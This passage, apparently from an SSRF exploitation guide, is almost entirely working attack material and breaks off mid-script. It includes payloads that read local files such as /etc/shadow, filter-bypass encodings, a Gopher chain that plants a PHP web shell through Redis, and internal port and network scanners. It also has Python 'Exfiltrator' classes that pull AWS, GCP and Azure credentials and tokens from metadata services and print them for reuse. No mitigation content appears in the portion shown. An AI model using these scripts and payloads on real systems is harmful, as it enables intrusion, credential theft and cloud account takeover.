```http
GET /fetch?url=http://internal-api.local/admin HTTP/1.1
```

**File protocol (local file access):**

```http
GET /fetch?url=file:///etc/passwd HTTP/1.1
GET /fetch?url=file:///c:/windows/win.ini HTTP/1.1
GET /fetch?url=file:///proc/self/environ HTTP/1.1
```

**FTP protocol:**

```http
GET /fetch?url=ftp://internal-ftp.local/file.txt HTTP/1.1
GET /fetch?url=ftp://admin:password@192.168.1.100/secrets.txt HTTP/1.1
```

**Gopher protocol (raw TCP):**

```http
GET /fetch?url=gopher://127.0.0.1:6379/_INFO HTTP/1.1
```

Gopher enables sending arbitrary data to TCP services:

```bash
# Redis exploitation via Gopher
# URL encode the Redis commands
gopher://127.0.0.1:6379/_SET%20mykey%20myvalue

# Memcached
gopher://127.0.0.1:11211/_stats

# SMTP
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com
```

**Dict protocol (dictionary network protocol):**

```http
GET /fetch?url=dict://127.0.0.1:6379/INFO HTTP/1.1
```

Useful for banner grabbing and service identification.

**TFTP protocol:**

```http
GET /fetch?url=tftp://192.168.1.1/config.txt HTTP/1.1
```

**LDAP protocol:**

```http
GET /fetch?url=ldap://127.0.0.1:389/dc=example,dc=com HTTP/1.1
```

**Custom protocols (application-specific):**

```http
GET /fetch?url=slack://hooks.slack.com/services/T00/B00/XX HTTP/1.1
GET /fetch?url=ssh://internal-server:22 HTTP/1.1
```

### Blind SSRF Detection

When no response content is returned, use timing and error-based techniques.

**Time-based detection:**

```bash
# Fast response (port open)
time curl "http://target.com/fetch?url=http://192.168.1.1:80"

# Slow response (port closed/filtered)
time curl "http://target.com/fetch?url=http://192.168.1.1:9999"

# Timeout (host unreachable)
time curl "http://target.com/fetch?url=http://192.168.1.254:80"
```

**Response size/status variations:**

```python
import requests

def blind_ssrf_detection(target_url, param_name):
    """
    Detect blind SSRF through response variations
    """
    test_hosts = [
        "http://127.0.0.1:80",      # Likely open
        "http://127.0.0.1:22",      # Likely open
        "http://127.0.0.1:9999",    # Likely closed
        "http://192.168.1.1:80",    # Internal network
        "http://google.com",        # External (may be blocked)
    ]
    
    baseline_times = []
    
    for host in test_hosts:
        params = {param_name: host}
        start = time.time()
        try:
            response = requests.get(target_url, params=params, timeout=10)
            elapsed = time.time() - start
            
            print(f"Host: {host}")
            print(f"Status: {response.status_code}")
            print(f"Time: {elapsed:.2f}s")
            print(f"Length: {len(response.text)}\n")
            
        except requests.Timeout:
            print(f"Host: {host} - TIMEOUT\n")
        except Exception as e:
            print(f"Host: {host} - Error: {e}\n")

blind_ssrf_detection("http://target.com/fetch", "url")
```

**DNS-based blind SSRF:**

```bash
# Use DNS logs to detect SSRF
# Tools: Burp Collaborator, interactsh, dnsbin

# interactsh setup
interactsh-client

# Generated domain: cXXXXXXXXXXXXXXXX.interact.sh
# Insert in SSRF payload
http://cXXXXXXXXXXXXXXXX.interact.sh

# Monitor for DNS queries confirming SSRF
```

### Filter Bypass Techniques

**IP representation variations:**

```bash
# Decimal notation
http://2130706433/           # 127.0.0.1 in decimal

# Octal notation
http://0177.0.0.1/           # 127.0.0.1 in octal
http://017700000001/         # Full octal

# Hexadecimal notation
http://0x7f.0x0.0x0.0x1/    # 127.0.0.1 in hex
http://0x7f000001/          # Compact hex

# Mixed representations
http://127.1/                # Short form
http://127.0.1/              # Shorter form

# Integer overflow (32-bit)
http://2130706433/           # 0x7F000001
```

**URL encoding bypass:**

```bash
# Single encoding
http://127.0.0.1 â†’ http://%31%32%37%2e%30%2e%30%2e%31

# Double encoding
http://127.0.0.1 â†’ http://%25%33%31%25%33%32%25%33%37%2e%25%33%30%2e%25%33%30%2e%25%33%31

# Unicode encoding
http://127.0.0.1 â†’ http://\u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031
```

**@ symbol bypass:**

```bash
# Format: http://expected-host@actual-host
http://google.com@127.0.0.1
http://trusted-domain.com@192.168.1.1
http://169.254.169.254@metadata.google.internal
```

**# fragment bypass:**

```bash
http://127.0.0.1#@google.com
http://localhost#.evil.com
```

**Backslash bypass:**

```bash
http://google.com\@127.0.0.1
http://127.0.0.1\.google.com
```

**Dot variations:**

```bash
# Standard
http://127ã€‚0ã€‚0ã€‚1        # Unicode dot
http://127%E3%80%820%E3%80%820%E3%80%821

# Localhost alternatives
http://localtest.me        # Resolves to 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
```

**Domain bypass via DNS rebinding:**

```bash
# Use services like:
# - rbndr.us
# - 1u.ms
# - rebind.it

# These domains resolve to different IPs on subsequent requests
http://7f000001.1u.ms      # First: public IP, Then: 127.0.0.1
```

**CRLF injection:**

```bash
# Inject newlines to manipulate HTTP request
http://127.0.0.1%0d%0aHost:%20attacker.com

# Full request smuggling
http://127.0.0.1:80%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a
```

**Open redirect chaining:**

```bash
# Application allows whitelisted domains
# Find open redirect on whitelisted domain

# Whitelisted: https://trusted-site.com
# Open redirect: https://trusted-site.com/redirect?url=http://127.0.0.1

# Final SSRF payload
http://target.com/fetch?url=https://trusted-site.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

**Protocol smuggling:**

```bash
# Bypass protocol restrictions
http://127.0.0.1:80@google.com:80/
http://0x7f.1/
jar:http://127.0.0.1!/
jar:file:///etc/passwd!/
```

### Exploitation Depth

**Basic internal resource access:**

```bash
# Internal web applications
curl "http://target.com/fetch?url=http://192.168.1.10/admin"

# Internal APIs
curl "http://target.com/fetch?url=http://internal-api.local:8080/v1/users"

# Database web interfaces
curl "http://target.com/fetch?url=http://10.0.0.5:8080/phpmyadmin"
```

**File system access:**

```bash
# Linux
curl "http://target.com/fetch?url=file:///etc/passwd"
curl "http://target.com/fetch?url=file:///etc/shadow"
curl "http://target.com/fetch?url=file:///proc/self/environ"
curl "http://target.com/fetch?url=file:///proc/self/cmdline"
curl "http://target.com/fetch?url=file:///proc/self/cwd/app.py"
curl "http://target.com/fetch?url=file:///var/log/apache2/access.log"

# Windows
curl "http://target.com/fetch?url=file:///c:/windows/win.ini"
curl "http://target.com/fetch?url=file:///c:/boot.ini"
curl "http://target.com/fetch?url=file:///c:/inetpub/wwwroot/web.config"
```

**Service exploitation via Gopher:**

**Redis command execution:**

```python
import urllib.parse

# Redis commands to execute
commands = [
    "FLUSHALL",
    "SET mykey 'malicious data'",
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SET shell '<?php system($_GET[\"cmd\"]); ?>'",
    "SAVE"
]

# Encode for Gopher
gopher_payload = "gopher://127.0.0.1:6379/_"
for cmd in commands:
    gopher_payload += urllib.parse.quote(cmd) + "%0d%0a"

print(gopher_payload)
```

**Memcached data exfiltration:**

```bash
# Gopher payload to extract memcached keys
gopher://127.0.0.1:11211/_stats%0d%0aitems%0d%0a

# Get specific key
gopher://127.0.0.1:11211/_get%20session_token%0d%0a
```

**FastCGI exploitation:**

```bash
# FastCGI on port 9000 (PHP-FPM)
gopher://127.0.0.1:9000/...
# Requires complex binary protocol encoding
# Use tools like Gopherus
```

### Exploitation Tools

**SSRFmap - Comprehensive SSRF exploitation framework:**

```bash
# Installation
git clone https://github.com/swisskyrepo/SSRFmap.git
cd SSRFmap
pip3 install -r requirements.txt

# Basic scan
python3 ssrfmap.py -r request.txt -p url -m scan

# Port scanning
python3 ssrfmap.py -r request.txt -p url -m portscan --lhost=192.168.1.1

# Cloud metadata extraction
python3 ssrfmap.py -r request.txt -p url -m aws

# Redis exploitation
python3 ssrfmap.py -r request.txt -p url -m redis --lhost=127.0.0.1 --lport=6379

# FastCGI exploitation
python3 ssrfmap.py -r request.txt -p url -m fastcgi --lhost=127.0.0.1 --lport=9000

# Custom Gopher payload
python3 ssrfmap.py -r request.txt -p url -m gopher --data="CUSTOM_PAYLOAD"
```

**Request file format (request.txt):**

```http
POST /fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"Â§URLÂ§"}
```

**Gopherus - Gopher payload generator:**

```bash
# Installation
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
chmod +x gopherus.py

# MySQL exploitation
./gopherus.py --exploit mysql

# PostgreSQL
./gopherus.py --exploit postgresql

# FastCGI
./gopherus.py --exploit fastcgi

# Redis
./gopherus.py --exploit redis

# Zabbix
./gopherus.py --exploit zabbix

# SMTP
./gopherus.py --exploit smtp
```

**Custom SSRF scanner:**

```python
import requests
import time

class SSRFScanner:
    def __init__(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        self.results = {}
    
    def test_localhost_access(self):
        """Test localhost access via various representations"""
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://0177.0.0.1",
            "http://2130706433",
        ]
        
        print("[*] Testing localhost access...")
        for payload in payloads:
            self.test_payload(payload, "localhost")
    
    def test_internal_networks(self):
        """Scan common internal IP ranges"""
        ranges = [
            "192.168.1.{}",
            "192.168.0.{}",
            "10.0.0.{}",
            "172.16.0.{}",
        ]
        
        print("[*] Scanning internal networks...")
        for ip_range in ranges:
            for i in [1, 10, 100, 254]:
                ip = ip_range.format(i)
                self.test_payload(f"http://{ip}", "internal")
    
    def test_cloud_metadata(self):
        """Test cloud metadata endpoints"""
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ]
        
        print("[*] Testing cloud metadata...")
        for payload in payloads:
            self.test_payload(payload, "cloud")
    
    def test_payload(self, payload, category):
        """Execute SSRF test with given payload"""
        params = {self.param_name: payload}
        
        try:
            start = time.time()
            response = requests.get(
                self.target_url,
                params=params,
                timeout=5,
                allow_redirects=False
            )
            elapsed = time.time() - start
            
            result = {
                "status": response.status_code,
                "time": elapsed,
                "length": len(response.text),
                "content_preview": response.text[:200]
            }
            
            # Detect successful SSRF indicators
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] POTENTIAL SSRF: {payload}")
                print(f"    Status: {response.status_code}")
                print(f"    Length: {len(response.text)}")
                print(f"    Preview: {response.text[:100]}\n")
            
            self.results[payload] = result
            
        except requests.Timeout:
            print(f"[-] Timeout: {payload}")
        except Exception as e:
            print(f"[-] Error with {payload}: {e}")
    
    def run_all_tests(self):
        """Execute all SSRF tests"""
        self.test_localhost_access()
        self.test_internal_networks()
        self.test_cloud_metadata()
        
        print("\n[*] Scan complete!")
        return self.results

# Usage
scanner = SSRFScanner("http://target.com/fetch", "url")
results = scanner.run_all_tests()
```

## Internal Network Scanning via SSRF

### Port Scanning Methodology

**Basic port scan:**

```bash
# Single port test
curl "http://target.com/fetch?url=http://192.168.1.1:80"
curl "http://target.com/fetch?url=http://192.168.1.1:22"
curl "http://target.com/fetch?url=http://192.168.1.1:3306"

# Common ports
# 21   - FTP
# 22   - SSH
# 23   - Telnet
# 25   - SMTP
# 53   - DNS
# 80   - HTTP
# 443  - HTTPS
# 3306 - MySQL
# 5432 - PostgreSQL
# 6379 - Redis
# 8080 - HTTP Alt
# 9200 - Elasticsearch
```

**Automated port scanner:**

```python
import requests
import concurrent.futures

class SSRFPortScanner:
    def __init__(self, target_url, param_name, internal_host):
        self.target_url = target_url
        self.param_name = param_name
        self.internal_host = internal_host
        self.open_ports = []
    
    def scan_port(self, port):
        """Test single port via SSRF"""
        payload = f"http://{self.internal_host}:{port}"
        params = {self.param_name: payload}
        
        try:
            response = requests.get(
                self.target_url,
                params=params,
                timeout=3,
                allow_redirects=False
            )
            
            # Detect open port indicators
            if response.status_code == 200:
                return port, "open", response.text[:100]
            elif response.status_code in [502, 504]:
                return port, "closed", ""
            else:
                return port, "filtered", ""
                
        except requests.Timeout:
            return port, "timeout", ""
        except Exception:
            return port, "error", ""
    
    def scan_ports(self, ports, threads=10):
        """Scan multiple ports concurrently"""
        print(f"[*] Scanning {self.internal_host}...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.scan_port, port): port for port in ports}
            
            for future in concurrent.futures.as_completed(futures):
                port, status, content = future.result()
                
                if status == "open":
                    self.open_ports.append(port)
                    print(f"[+] Port {port}: OPEN")
                    if content:
                        print(f"    Content: {content}")
                elif status == "filtered":
                    print(f"[?] Port {port}: FILTERED")
        
        return self.open_ports

# Usage
common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200]

scanner = SSRFPortScanner(
    "http://target.com/fetch",
    "url",
    "192.168.1.1"
)

open_ports = scanner.scan_ports(common_ports, threads=5)
print(f"\n[*] Found {len(open_ports)} open ports: {open_ports}")
```

**Timing-based port detection:**

```python
import requests
import time

def timing_based_port_scan(target_url, param_name, host, ports):
    """
    Use response timing to detect open/closed ports
    Open ports: faster response
    Closed ports: connection refused (fast)
    Filtered ports: timeout (slow)
    """
    results = {}
    
    for port in ports:
        payload = f"http://{host}:{port}"
        params = {param_name: payload}
        
        start = time.time()
        try:
            response = requests.get(target_url, params=params, timeout=5)
            elapsed = time.time() - start
            
            results[port] = {
                "time": elapsed,
                "status": response.status_code,
                "length": len(response.text)
            }
            
            # Classification heuristics
            if elapsed < 1.0:
                state = "open/closed"
            elif elapsed > 4.0:
                state = "filtered"
            else:
                state = "unknown"
            
            print(f"Port {port}: {state} ({elapsed:.2f}s)")
            
        except requests.Timeout:
            print(f"Port {port}: filtered (timeout)")
        except Exception as e:
            print(f"Port {port}: error ({e})")
    
    return results

# Usage
timing_based_port_scan("http://target.com/fetch", "url", "10.0.0.1", [80, 443, 8080, 9999])
```

### Service Banner Grabbing

**HTTP service enumeration:**

```bash
# Retrieve HTTP banners
curl "http://target.com/fetch?url=http://192.168.1.1:80"

# Check for common paths
curl "http://target.com/fetch?url=http://192.168.1.1:80/admin"
curl "http://target.com/fetch?url=http://192.168.1.1:80/api/v1"
curl "http://target.com/fetch?url=http://192.168.1.1:8080/manager/html"
```

**Using dict:// protocol for banners:**

```bash
# Dict protocol useful for banner grabbing
curl "http://target.com/fetch?url=dict://192.168.1.1:22"
curl "http://target.com/fetch?url=dict://192.168.1.1:3306"
curl "http://target.com/fetch?url=dict://192.168.1.1:6379"
```

**Service-specific probes:**

```python
def service_detection(target_url, param_name, host, port):
    """Detect service type on open port"""
    probes = {
        "http": f"http://{host}:{port}/",
        "dict": f"dict://{host}:{port}/INFO",
        "gopher_redis": f"gopher://{host}:{port}/_INFO",
    }
    
    for proto, payload in probes.items():
        params = {param_name: payload}
        try:
            response = requests.get(target_url, params=params, timeout=3)
            
            # Service fingerprinting
            content = response.text.lower()
            if "redis" in content:
                return "Redis"
            elif "mysql" in content:
                return "MySQL"
            elif "postgresql" in content:
                return "PostgreSQL"
            elif "http" in response.headers.get("Server", "").lower():
                return f"HTTP ({response.headers.get('Server')})"
            elif "<html" in content:
                return "HTTP Server"
                
        except Exception:
            continue
    
    return "Unknown"
```

### Network Topology Mapping

**Subnet enumeration:**

```bash
# Test common internal subnets
for subnet in 192.168.{0..255}; do
  curl "http://target.com/fetch?url=http://$subnet.1:80" &
done
wait

# Private IP ranges
# 10.0.0.0/8
# 172.16.0.0/12
# 192.168.0.0/16
```

**Gateway discovery:**

```bash
# Common gateway IPs
curl "http://target.com/fetch?url=http://192.168.1.1"
curl "http://target.com/fetch?url=http://192.168.0.1"
curl "http://target.com/fetch?url=http://10.0.0.1"
curl "http://target.com/fetch?url=http://172.16.0.1"

# Router web interfaces
curl "http://target.com/fetch?url=http://192.168.1.1/cgi-bin/luci"
curl "http://target.com/fetch?url=http://192.168.1.1/admin"
```

**Kubernetes/Docker internal services:**

```bash
# Kubernetes service DNS
curl "http://target.com/fetch?url=http://kubernetes.default.svc.cluster.local"
curl "http://target.com/fetch?url=http://kubernetes.default.svc"

# Docker internal network
curl "http://target.com/fetch?url=http://172.17.0.1"

# Kubernetes API server
curl "http://target.com/fetch?url=https://10.96.0.1:443/api/v1/namespaces"
```

**Full network mapper:**

```python
import requests
import ipaddress
import concurrent.futures

class InternalNetworkMapper:
    def __init__(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        self.alive_hosts = []
    
    def check_host(self, ip):
        """Check if host is reachable"""
        payload = f"http://{ip}:80"
        params = {self.param_name: payload}
        
        try:
            response = requests.get(self.target_url, params=params, timeout=2)
            
            # Host alive indicators
            if response.status_code in [200, 401, 403, 301, 302]:
                return str(ip), True, response.status_code
            else:
                return str(ip), False, None
                
        except:
            return str(ip), False, None
    
    def scan_network(self, network_cidr, threads=20):
        """Scan entire network range"""
        network = ipaddress.IPv4Network(network_cidr, strict=False)
        print(f"[*] Scanning {network_cidr} ({network.num_addresses} addresses)...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.check_host, ip): ip for ip in network.hosts()}
            
            for future in concurrent.futures.as_completed(futures):
                ip, alive, status = future.result()
                
                if alive:
                    self.alive_hosts.append(ip)
                    print(f"[+] Host alive: {ip} (Status: {status})")
        
        return self.alive_hosts

# Usage
mapper = InternalNetworkMapper("http://target.com/fetch", "url")
alive_hosts = mapper.scan_network("192.168.1.0/24", threads=50)

print(f"\n[*] Discovered {len(alive_hosts)} alive hosts")
for host in alive_hosts:
    print(f"    {host}")
```

### Internal Application Discovery

**Common internal applications:**

```bash
# Jenkins
curl "http://target.com/fetch?url=http://192.168.1.10:8080/jenkins"

# GitLab
curl "http://target.com/fetch?url=http://192.168.1.20/gitlab"

# Grafana
curl "http://target.com/fetch?url=http://192.168.1.30:3000"

# Prometheus
curl "http://target.com/fetch?url=http://192.168.1.40:9090/metrics"

# Elasticsearch
curl "http://target.com/fetch?url=http://192.168.1.50:9200/_cluster/health"

# Docker Registry
curl "http://target.com/fetch?url=http://192.168.1.60:5000/v2/_catalog"

# etcd
curl "http://target.com/fetch?url=http://192.168.1.70:2379/v2/keys"
```

**Database interfaces:**

```bash
# phpMyAdmin
curl "http://target.com/fetch?url=http://192.168.1.1/phpmyadmin"

# pgAdmin
curl "http://target.com/fetch?url=http://192.168.1.2:5050"

# MongoDB Express
curl "http://target.com/fetch?url=http://192.168.1.3:8081"

# Redis Commander
curl "http://target.com/fetch?url=http://192.168.1.4:8082"
```

## Cloud Metadata Exploitation

Cloud providers expose instance metadata services containing sensitive information including credentials, API keys, and configuration data.

### AWS Metadata Service (IMDSv1 & IMDSv2)

**IMDSv1 exploitation (legacy):**

```
# Basic metadata access

curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# IAM role enumeration

curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Retrieve IAM credentials

curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]"

# Returns:

# {

# "AccessKeyId": "ASIA...",

# "SecretAccessKey": "...",

# "Token": "...",

# "Expiration": "2024-10-17T..."

# }

# User data (may contain secrets)

curl "http://target.com/fetch?url=http://169.254.169.254/latest/user-data"

# Instance identity document

curl "http://target.com/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document"
````

**Complete AWS metadata enumeration:**
```python
import requests
import json

class AWSMetadataExfiltrator:
    def __init__(self, ssrf_url, ssrf_param):
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.base_url = "http://169.254.169.254/latest/meta-data/"
        self.metadata = {}
    
    def fetch_metadata(self, path):
        """Fetch metadata via SSRF"""
        full_url = self.base_url + path
        params = {self.ssrf_param: full_url}
        
        try:
            response = requests.get(self.ssrf_url, params=params, timeout=5)
            if response.status_code == 200:
                return response.text
        except Exception as e:
            print(f"[!] Error fetching {path}: {e}")
        
        return None
    
    def enumerate_endpoints(self):
        """Enumerate all metadata endpoints"""
        endpoints = [
            "ami-id",
            "ami-launch-index",
            "ami-manifest-path",
            "hostname",
            "instance-id",
            "instance-type",
            "local-hostname",
            "local-ipv4",
            "public-hostname",
            "public-ipv4",
            "public-keys/",
            "security-groups",
            "iam/security-credentials/",
        ]
        
        print("[*] Enumerating AWS metadata...")
        
        for endpoint in endpoints:
            data = self.fetch_metadata(endpoint)
            if data:
                print(f"[+] {endpoint}:")
                print(f"    {data[:200]}")
                self.metadata[endpoint] = data
        
        return self.metadata
    
    def extract_iam_credentials(self):
        """Extract IAM role credentials"""
        print("\n[*] Extracting IAM credentials...")
        
        # Get available roles
        roles_data = self.fetch_metadata("iam/security-credentials/")
        if not roles_data:
            print("[-] No IAM roles found")
            return None
        
        roles = roles_data.strip().split('\n')
        print(f"[+] Found roles: {roles}")
        
        credentials = {}
        for role in roles:
            print(f"[*] Fetching credentials for role: {role}")
            creds_data = self.fetch_metadata(f"iam/security-credentials/{role}")
            
            if creds_data:
                try:
                    creds_json = json.loads(creds_data)
                    credentials[role] = creds_json
                    
                    print(f"[+] Credentials for {role}:")
                    print(f"    AccessKeyId: {creds_json.get('AccessKeyId')}")
                    print(f"    SecretAccessKey: {creds_json.get('SecretAccessKey')[:20]}...")
                    print(f"    Token: {creds_json.get('Token')[:50]}...")
                    
                except json.JSONDecodeError:
                    print(f"[-] Failed to parse credentials for {role}")
        
        return credentials
    
    def extract_user_data(self):
        """Extract instance user-data"""
        print("\n[*] Extracting user-data...")
        
        params = {self.ssrf_param: "http://169.254.169.254/latest/user-data"}
        try:
            response = requests.get(self.ssrf_url, params=params, timeout=5)
            if response.status_code == 200 and response.text:
                print("[+] User-data found:")
                print(response.text[:500])
                return response.text
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return None
    
    def full_exploitation(self):
        """Complete AWS metadata exploitation"""
        self.enumerate_endpoints()
        credentials = self.extract_iam_credentials()
        user_data = self.extract_user_data()
        
        return {
            "metadata": self.metadata,
            "credentials": credentials,
            "user_data": user_data
        }

# Usage
aws_exfil = AWSMetadataExfiltrator("http://target.com/fetch", "url")
results = aws_exfil.full_exploitation()

# Save credentials for AWS CLI usage
if results['credentials']:
    for role, creds in results['credentials'].items():
        print(f"\n[*] AWS CLI configuration for {role}:")
        print(f"export AWS_ACCESS_KEY_ID={creds['AccessKeyId']}")
        print(f"export AWS_SECRET_ACCESS_KEY={creds['SecretAccessKey']}")
        print(f"export AWS_SESSION_TOKEN={creds['Token']}")
````

**IMDSv2 bypass techniques:**

IMDSv2 requires a session token obtained via PUT request:

```bash
# Standard IMDSv2 workflow (not possible via basic SSRF)
# 1. PUT request to get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
         -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2. Use token in subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     "http://169.254.169.254/latest/meta-data/"
```

**IMDSv2 bypass scenarios:**

1. **HTTP method override headers:**

```http
POST /fetch HTTP/1.1
Host: target.com
X-HTTP-Method-Override: PUT

url=http://169.254.169.254/latest/api/token
```

2. **SSRF with full request control:**

```bash
# If SSRF allows specifying full HTTP request
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a
```

3. **Server-side proxy misconfigurations:**

```bash
# Some proxies may add required headers
# Test if application's SSRF proxy automatically handles IMDSv2
```

### Google Cloud Platform (GCP) Metadata

**GCP metadata exploitation:**

```bash
# Basic metadata (requires Metadata-Flavor header)
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
     -H "Metadata-Flavor: Google"

# Project ID
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id" \
     -H "Metadata-Flavor: Google"

# Access tokens
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
     -H "Metadata-Flavor: Google"

# Returns:
# {
#   "access_token": "ya29...",
#   "expires_in": 3599,
#   "token_type": "Bearer"
# }

# Service account email
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
     -H "Metadata-Flavor: Google"

# All service accounts
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
     -H "Metadata-Flavor: Google"

# SSH keys
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" \
     -H "Metadata-Flavor: Google"

# Startup script (may contain credentials)
curl "http://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" \
     -H "Metadata-Flavor: Google"
```

**GCP header bypass techniques:**

If SSRF doesn't preserve custom headers, try:

```bash
# URL fragments (some parsers ignore after #)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token#
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json

# DNS alternatives
http://metadata.google.internal
http://metadata
http://169.254.169.254

# Header injection via CRLF
http://metadata.google.internal/computeMetadata/v1/project/project-id%0d%0aMetadata-Flavor:%20Google%0d%0a
```

**GCP exploitation script:**

```python
import requests
import json

class GCPMetadataExfiltrator:
    def __init__(self, ssrf_url, ssrf_param):
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.base_url = "http://metadata.google.internal/computeMetadata/v1/"
        
    def fetch_metadata(self, path, try_header_bypass=True):
        """Fetch GCP metadata via SSRF"""
        full_url = self.base_url + path
        
        # Try with header first (if SSRF preserves headers)
        params = {self.ssrf_param: full_url}
        headers = {"Metadata-Flavor": "Google"}
        
        try:
            response = requests.get(self.ssrf_url, params=params, headers=headers, timeout=5)
            if response.status_code == 200:
                return response.text
        except:
            pass
        
        # Try header bypass techniques
        if try_header_bypass:
            bypass_urls = [
                full_url + "?alt=json",
                full_url + "#",
                full_url.replace("metadata.google.internal", "metadata"),
            ]
            
            for bypass_url in bypass_urls:
                try:
                    params = {self.ssrf_param: bypass_url}
                    response = requests.get(self.ssrf_url, params=params, timeout=5)
                    if response.status_code == 200:
                        return response.text
                except:
                    continue
        
        return None
    
    def get_access_token(self):
        """Extract GCP access token"""
        print("[*] Extracting GCP access token...")
        
        token_data = self.fetch_metadata("instance/service-accounts/default/token")
        if token_data:
            try:
                token_json = json.loads(token_data)
                access_token = token_json.get('access_token')
                
                print(f"[+] Access token obtained:")
                print(f"    {access_token[:50]}...")
                print(f"    Expires in: {token_json.get('expires_in')} seconds")
                
                return access_token
            except json.JSONDecodeError:
                print("[-] Failed to parse token")
        
        return None
    
    def enumerate_all(self):
        """Enumerate all GCP metadata"""
        endpoints = [
            "project/project-id",
            "project/numeric-project-id",
            "instance/id",
            "instance/name",
            "instance/zone",
            "instance/machine-type",
            "instance/service-accounts/",
            "instance/service-accounts/default/email",
            "instance/service-accounts/default/scopes",
            "instance/attributes/",
            "project/attributes/ssh-keys",
        ]
        
        print("[*] Enumerating GCP metadata...")
        results = {}
        
        for endpoint in endpoints:
            data = self.fetch_metadata(endpoint)
            if data:
                print(f"[+] {endpoint}:")
                print(f"    {data[:200]}")
                results[endpoint] = data
        
        return results

# Usage
gcp_exfil = GCPMetadataExfiltrator("http://target.com/fetch", "url")
token = gcp_exfil.get_access_token()
metadata = gcp_exfil.enumerate_all()

# Use token with gcloud CLI
if token:
    print(f"\n[*] Use token with gcloud:")
    print(f"gcloud auth activate-service-account --access-token-file=<(echo '{token}')")
```

### Azure Metadata Service

**Azure metadata exploitation:**

```bash
# Instance metadata (requires Metadata: true header)
curl "http://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
     -H "Metadata: true"

# Returns instance details:
# {
#   "compute": {...},
#   "network": {...}
# }

# Managed identity access token
curl "http://target.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
     -H "Metadata: true"

# Returns:
# {
#   "access_token": "eyJ0eXAi...",
#   "expires_in": "3599",
#   "resource": "https://management.azure.com/",
#   "token_type": "Bearer"
# }

# Different resource tokens
# Azure Resource Manager
resource=https://management.azure.com/

# Azure Storage
resource=https://storage.azure.com/

# Azure Key Vault
resource=https://vault.azure.net

# Microsoft Graph API
resource=https://graph.microsoft.com/
```

**Azure exploitation script:**

```python
import requests
import json

class AzureMetadataExfiltrator:
    def __init__(self, ssrf_url, ssrf_param):
        self.ssrf_url = ssrf_url
        self.ssrf_param = ssrf_param
        self.metadata_url = "http://169.254.169.254/metadata/"
    
    def fetch_metadata(self, endpoint, api_version="2021-02-01"):
        """Fetch Azure metadata via SSRF"""
        full_url = f"{self.metadata_url}{endpoint}?api-version={api_version}"
        params = {self.ssrf_param: full_url}
        headers = {"Metadata": "true"}
        
        try:
            response = requests.get(self.ssrf_url, params=params, headers=headers, timeout=5)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(f"[!] Error: {e}")
        
        return None
    
    def get_instance_metadata(self):
        """Get instance metadata"""
        print("[*] Fetching instance metadata...")
        
        data = self.fetch_metadata("instance")
        if data:
            print("[+] Instance metadata:")
            print(f"    VM ID: {data.get('compute', {}).get('vmId')}")
            print(f"    Name: {data.get('compute', {}).get('name')}")
            print(f"    Location: {data.get('compute', {}).get('location')}")
            print(f"    Resource Group: {data.get('compute', {}).get('resourceGroupName')}")
            print(f"    Subscription: {data.get('compute', {}).get('subscriptionId')}")
        
        return data
    
    def get_access_tokens(self):
        """Extract managed identity tokens for various resources"""
        print("\n[*] Extracting managed identity tokens...")
        
        resources = [
            ("Azure Resource Manager", "https://management.azure.com/"),
            ("Azure Storage", "https://storage.azure.com/"),
            ("Azure Key Vault", "https://vault.azure.net"),
            ("Microsoft Graph", "https://graph.microsoft.com/"),
        ]
        
        tokens = {}
        
        for name, resource in resources:
            print(f"[*] Requesting token for: {name}")
            
            endpoint = f"identity/oauth2/token?resource={resource}"
